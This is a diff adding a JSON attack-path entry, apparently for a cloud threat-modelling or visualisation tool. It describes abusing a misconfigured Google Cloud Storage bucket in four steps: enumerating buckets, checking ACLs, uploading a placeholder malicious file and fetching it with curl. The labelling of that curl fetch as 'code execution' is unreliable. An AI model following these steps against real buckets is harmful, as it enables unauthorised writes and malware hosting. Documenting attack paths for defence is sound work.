@@ -1,0 +1,58 @@
+{
+    "title": "Exploit Bucket Misconfiguration for Arbitrary File Upload",
+    "icon": "https://img.icons8.com/?size=100&id=44471&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List Buckets",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "gsutil ls",
+                "description": "Lists all Cloud Storage buckets in the specified GCP project.",
+                "services": ["Cloud Storage"],
+                "attack_types": ["Enumeration"],
+                "references": "https://cloud.google.com/storage/docs/gsutil/commands/ls"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Check Bucket ACL",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/acl.png",
+            "details": {
+                "command": "gsutil acl get gs://<BucketName>",
+                "description": "Checks the ACL of the specified Cloud Storage bucket.",
+                "services": ["Cloud Storage"],
+                "attack_types": ["Enumeration"],
+                "references": "https://cloud.google.com/storage/docs/access-control/lists"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Upload Malicious File",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/upload.png",
+            "details": {
+                "command": "gsutil cp <MaliciousFile> gs://<BucketName>/",
+                "description": "Uploads a malicious file to the misconfigured Cloud Storage bucket.",
+                "services": ["Cloud Storage"],
+                "attack_types": ["Code Execution"]
+            }
+        },
+        {
+            "id": 5,
+            "label": "Trigger Malicious File",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/trigger.png",
+            "details": {
+                "command": "curl https://storage.googleapis.com/<BucketName>/<MaliciousFile>",
+                "description": "Triggers the malicious file hosted in the Cloud Storage bucket.",
+                "services": ["Cloud Storage"],
+                "attack_types": ["Code Execution"]
+            }
+        }
+    ]
+}
